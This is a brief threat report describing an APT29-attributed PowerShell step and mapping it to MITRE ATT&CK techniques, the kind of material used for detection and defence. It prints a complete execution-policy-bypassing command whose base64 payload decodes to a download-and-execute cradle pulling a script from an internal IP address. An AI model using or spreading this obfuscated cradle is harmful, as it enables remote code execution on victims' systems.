Threat Report: APT29 PowerShell Encoded Command Execution

The attacker used PowerShell to download and execute a malicious payload. The command line observed was:

powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA

This technique is consistent with T1059.001 (PowerShell execution) and T1105 (Ingress Tool Transfer).

The encoded command decodes to a web client download from a known malicious IP address.
